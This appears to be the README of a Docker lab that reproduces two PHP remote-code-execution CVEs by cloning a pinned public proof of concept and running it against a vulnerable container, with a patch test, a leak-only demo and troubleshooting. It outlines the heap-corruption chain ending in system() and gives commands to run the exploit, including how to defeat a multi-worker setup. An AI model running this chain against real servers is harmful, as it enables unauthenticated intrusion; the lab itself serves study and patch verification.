# php2shell lab

A small, reproducible Docker lab for **CVE-2026-109618** and **CVE-2026-109619**
in PHP. It runs the stock `php:8.4.26-apache` image with a hello-world app, then
runs a public proof of concept against it. The proof is `id`, not a reverse
shell.

This is a weaponized exploit lab. Keep it on `127.0.0.1`, do not expose it to
the internet, and only run it against systems you own or have written permission
to test.

## What is in here

```text
.
├── Dockerfile
├── docker-compose.yml
├── src/index.php
├── apache/zz-single-worker.conf
├── php/99-lab.ini
├── scripts/
│   ├── fetch-poc.sh
│   ├── preflight.sh
│   ├── wait-for-http.sh
│   ├── run-demo.sh
│   ├── run-patched.sh
│   └── leak-only.py
└── out/                 # proof file from the exploit
```

The Dockerfile builds from the official image digest pinned in
`docker-compose.yml`. It copies `php.ini-production` into place and adds only the
lab config and the hello-world app. It does not recompile PHP.

## Verified environment

The lab was tested clean-room on:

- Debian 13.7, x86_64
- Docker 29.9.0 and Docker Compose v5.6.0
- PHP 8.4.26, Apache 2.4.69 prefork, `mod_php`
- glibc 2.41
- `memory_limit=128M`, `post_max_size=8M`, `display_errors=Off`
- `zend.assertions=-1`
- `session.upload_progress.enabled=On`
- ASLR enabled (`randomize_va_space=2`)
- Unprivileged container, default seccomp and capabilities

The PoC is calibrated for this amd64 build. ARM64 is not supported by this lab.
On Apple Silicon, use an x86_64 VM or expect to port the offsets yourself.

## Requirements

- Linux x86_64, or Docker Desktop on Windows x86_64 with WSL2
- Docker Engine and Docker Compose v2
- Python 3.10 or newer
- `git`
- About 2 GB of disk for the images and PoC clone

Windows note: the shell scripts are bash scripts. Run them from WSL2 or Git
Bash. Native PowerShell can run the same `docker compose` and `python` commands
manually. See the Windows section below.

## Quick start

```bash
cd /home/jc/www/php2shell
./scripts/preflight.sh
./scripts/run-demo.sh
```

Or with make:

```bash
make preflight
make demo
make patched
```

`make verify` runs the vulnerable and patched demos back to back.

The first build pulls the official PHP image. The first run also clones the
third-party PoC into `.poc/` and pins it to the tested commit.

Expected proof:

```text
================ PROOF ================
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hello from php2shell
=======================================
```

## Test the patch

The patched service uses the same Dockerfile and config, but the fixed
`php:8.4.27-apache` image:

```bash
./scripts/run-patched.sh
```

Expected result:

```text
[+] PASS: no proof on the patched target
```

The exploit gets as far as the leak stage and fails with `no heap pointers in
leak window`. That is the point: the same request no longer produces the
primitive.

## Memory-disclosure-only demo

If you want to show the bug without executing a command, run the leak stage:

```bash
python3 scripts/leak-only.py
```

Expected output is around 819 KB of decoded cookie data, a leaked
`zval_ptr_dtor` pointer, the derived libphp base, and heap chunk candidates. The
cookie contains live worker memory, so do not paste it into reports.

Run this on a fresh container. If you then want the full RCE demo, restart the
target first:

```bash
docker compose restart vuln
./scripts/run-demo.sh
```

## What the chain is doing

| Stage | What it sends | What it gets |
|---|---|---|
| A1 | Multipart body with nested empty file fields and `PHP_SESSION_UPLOAD_PROGRESS` | OOM during session-cookie cleanup, leaving a dangling `PS(id)` |
| B1 | Forged `zend_string` header at the stale ID | About 800 KB of worker memory in a `Set-Cookie`, plus libphp and heap addresses |
| A2 | Another multipart body that exhausts memory | Dangling `PS(http_session_vars)` |
| B2 | Sprayed fake reference and fake `zend_array` | `pDestructor = zif_system`, so shutdown calls `system()` |

The app never runs during the trigger. A hello-world `index.php` is enough.

## Configuration

`php/99-lab.ini` only overrides a few values:

```ini
display_errors = Off
display_startup_errors = Off
log_errors = On
error_reporting = E_ALL
memory_limit = 128M
post_max_size = 8M
upload_max_filesize = 2M
session.save_path = "/tmp"
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
```

The base INI is the official `php.ini-production`, copied in the Dockerfile.
This matters. A different INI can change the heap layout and break the chain.

The Apache config in `apache/zz-single-worker.conf` sets one prefork worker.
That makes the cross-request chain deterministic. It is a teaching choice, not
a requirement. The stock 150-worker config also works: hold 149 workers open
with partial POSTs, then run the PoC with `--workers 150`. The public PoC does
that automatically.

## Troubleshooting

**`no heap pointers in leak window`**

Retry. The PoC already retries five times. If it keeps failing, check the
preflight output. The usual causes are the wrong PHP build, a different INI,
more than one worker, or traffic hitting the container during the run.

**`implausible libphp-main delta`**

A bad leak. The script re-leaks and tries again. If it happens every time,
check the image digest and `zend.assertions`.

**No proof file**

Check the logs:

```bash
docker compose logs --tail=120 vuln
```

Look for:

```text
PHP Fatal error: Allowed memory size of 134217728 bytes exhausted
(tried to allocate 4096 bytes) in Unknown on line 0
```

`Unknown on line 0` means the OOM happened during request startup, not in the
app.

**The worker segfaults**

That can happen after B2. The command has already run. Check `out/pwned` or:

```bash
docker compose exec vuln cat /out/pwned
```

Do not use a crash as your only success signal.

**Permission denied on `out/pwned`**

The container writes as `www-data` (uid 33). The setup script makes `out`
world-writable for the lab. If your platform does not map that correctly, read
the file from the container instead:

```bash
docker compose exec vuln cat /out/pwned
```

**`server reached MaxRequestWorkers`**

Expected. The exploit opens several connections and the lab has one worker.

**The image builds for the wrong architecture**

The Compose file sets `platform: linux/amd64`. Check:

```bash
docker image inspect php2shell-lab:8.4.26 --format '{{.Architecture}}'
```

It should print `amd64`.

## Windows

Docker Desktop on Windows runs Linux containers in a VM. The lab is still a
Linux PHP build, which is what the PoC targets.

Use WSL2 or Git Bash for the scripts:

```bash
./scripts/preflight.sh
./scripts/run-demo.sh
```

If you want to run the steps natively in PowerShell, the equivalent is:

```powershell
docker compose up -d --build --wait vuln
git clone https://github.com/9bie/php2shell-bypass-aslr-exp .poc\php2shell-bypass-aslr-exp
git -C .poc\php2shell-bypass-aslr-exp checkout --detach 17e98ee81025cccfd94b4f9c9a17bf269c65ff75
python .poc\php2shell-bypass-aslr-exp\exploit.py --port 18088 --workers 1 --retries 5 --proof ".\out\pwned" --cmd "id > /out/pwned"
docker compose exec vuln cat /out/pwned
```

Windows bind-mount permissions can be inconsistent. If the host proof file is
missing but the command ran, use `docker compose exec vuln cat /out/pwned`.
The bash wrapper already falls back to that.

I could only test on Linux. Windows is expected to work with Docker Desktop and
WSL2, but it is not verified here.

## Cleanup

```bash
docker compose --profile patched down -v
rm -rf .poc out/pwned
```

## Attribution

I did not discover these vulnerabilities and I did not write the exploit.

- **Vulnerability research and disclosure:** Calif (Ryan Austin), Wiz Research,
  OpenAI's Patch the Planet, and the PHP Foundation / PHP security team.
- **PoC used:** `9bie/php2shell-bypass-aslr-exp`, commit
  `17e98ee81025cccfd94b4f9c9a17bf269c65ff75`. The repository has no license file,
  so this lab clones it at a pinned commit instead of vendoring it.
- **Detection rules reference:** `ikow/php2shell-poc` by Qi Deng, MIT licensed.
- **Sources:** PHP's October 21, 2026 advisory, the two GitHub security
  advisories, Calif's writeup, Wiz's writeup, Datadog Security Labs, Rapid7,
  AWS MadPot, watchTowr, Unit 42, and NVD.

See `THIRD_PARTY_NOTICES.md` for the exact links and license notes.

## References

- https://www.php.net/archive/2026.php#2026-10-21-5
- https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w
- https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp
- https://calif.io/php2shell/
- https://www.wiz.io/blog/php2shell-php-rce
- https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/
- https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php/
- https://github.com/9bie/php2shell-bypass-aslr-exp
- https://github.com/ikow/php2shell-poc
